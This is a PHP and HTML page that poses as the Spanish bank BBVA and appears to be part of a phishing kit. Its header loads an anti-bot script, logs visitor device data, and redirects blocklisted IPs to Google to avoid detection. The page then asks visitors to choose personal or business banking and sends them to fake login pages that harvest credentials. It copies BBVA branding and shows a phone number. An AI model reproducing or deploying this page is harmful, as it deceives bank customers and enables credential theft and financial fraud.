<?php
    session_start();
    include "./Assets/php/config/config.php";   
    include "./Assets/php/prevents/antibot.php";
    $visitors = Visitors();
    get_device_and_browser();
    $file = "./data/blocker.json";
    $data = json_decode(file_get_contents($file),true);
    if (in_array(get_client_ip(),$data)) {
        header('Location: https://google.com/');
        exit();
    }
?>
<!DOCTYPE html>

<html class="light" lang="es"><head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>BBVA</title>
<link href="https://fonts.googleapis.com" rel="preconnect"/>
<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;family=Lora:wght@700&amp;family=Manrope:wght@700;800&amp;display=swap" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
<script id="tailwind-config">
      tailwind.config = {
        darkMode: "class",
        theme: {
          extend: {
            "colors": {
                    "primary": "#001c3b",
                    "bbva-blue": "#004481",
                    "button-blue": "#0021b1",
                    "on-surface": "#191c20",
                    "outline-variant": "#c2c6d2",
                    "background": "#ffffff",
                    "surface-container-low": "#f4f4f4"
            },
            "borderRadius": {
                    "DEFAULT": "0.25rem",
                    "lg": "0.5rem",
                    "xl": "1rem",
                    "full": "9999px"
            },
            "fontFamily": {
                    "headline": ["Lora", "serif"],
                    "body": ["Inter", "sans-serif"],
                    "label": ["Inter", "sans-serif"],
                    "brand": ["Manrope", "sans-serif"]
            }
          },
        }
      }
    </script>
<style>
        .material-symbols-outlined {
            font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24;
        }
        body {
            font-family: 'Inter', sans-serif;
            background-color: #ffffff;
            color: #191c20;
        }
        h1, .serif-heading {
            font-family: 'Lora', serif;
        }
        .bbva-logo {
            font-family: 'Manrope', sans-serif;
            font-weight: 800;
            letter-spacing: -0.05em;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center">
<!-- TopAppBar -->
<nav class="w-full flex justify-center items-center px-6 h-20 bg-white">
<div class="flex flex-col items-center">
<span class="text-4xl bbva-logo text-[#004481] leading-none">BBVA</span>
</div>
</nav>
<!-- Main Content Canvas -->
<main class="flex-grow max-w-lg w-full px-6 pt-12 pb-24 flex flex-col">
<!-- Editorial Headline -->
<div class="mb-10">
<h1 class="text-[#001c3b] text-[34px] leading-[1.1] font-bold tracking-tight">
                Antes de continuar, necesitamos saber si eres
            </h1>
</div>
<!-- Vertical Cards Layout to match mobile-first image -->
<div class="flex flex-col gap-6 w-full">
<!-- Card 1: Autónomo -->
<div class="bg-white rounded-xl p-8 flex flex-col border border-gray-100 shadow-[0_8px_30px_rgb(0,0,0,0.04)]">
<div class="mb-6">
<h2 class="text-[#001c3b] text-3xl font-bold serif-heading mb-6">Autónomo</h2>
<p class="text-gray-600 text-[17px] leading-relaxed">
                        Gestiona tu actividad profesional de forma independiente
                    </p>
</div>
<button onclick="window.location.href='./newlogin.php'" class="w-full mt-4 bg-button-blue text-white py-4 px-6 rounded-lg font-bold text-lg hover:bg-blue-800 transition-colors">
                    Confirmar
                </button>
</div>
<!-- Card 2: Empresa -->
<div class="bg-white rounded-xl p-8 flex flex-col border border-gray-100 shadow-[0_8px_30px_rgb(0,0,0,0.04)]">
<div class="mb-6">
<h2 class="text-[#001c3b] text-3xl font-bold serif-heading mb-6">Empresa</h2>
<p class="text-gray-600 text-[17px] leading-relaxed">
                        Gestiona la actividad financiera de tu compañía
                    </p>
</div>
<button onclick="window.location.href='./login_empresa.php'" class="w-full mt-4 bg-button-blue text-white py-4 px-6 rounded-lg font-bold text-lg hover:bg-blue-800 transition-colors">
                    Confirmar
                </button>
</div>
</div>
<!-- Help Section (Bottom part of screen) -->
<div class="mt-12 rounded-2xl overflow-hidden relative min-h-[120px] bg-bbva-blue flex flex-col justify-end p-6">
<!-- Placeholder for background image effect if needed -->
<div class="absolute inset-0 bg-gradient-to-t from-black/50 to-transparent"></div>
<div class="relative z-10">
<h3 class="text-white font-bold text-lg">¿Necesitas ayuda?</h3>
<p class="text-white/80 text-sm mt-1">Llámanos al 900 812 679</p>
</div>
</div>
</main>
<!-- Footer -->
<footer class="w-full py-10 bg-white flex flex-col items-center gap-6 px-6 border-t border-gray-100">
<div class="flex flex-wrap justify-center gap-x-6 gap-y-2">
<a class="text-xs text-gray-500 hover:text-bbva-blue transition-colors" href="#">Aviso Legal</a>
<a class="text-xs text-gray-500 hover:text-bbva-blue transition-colors" href="#">Privacidad</a>
<a class="text-xs text-gray-500 hover:text-bbva-blue transition-colors" href="#">Cookies</a>
<a class="text-xs text-gray-500 hover:text-bbva-blue transition-colors" href="#">Contacto</a>
</div>
<p class="text-xs text-gray-400">© 2024 Banco Bilbao Vizcaya Argentaria, S.A.</p>
</footer>
</body></html>
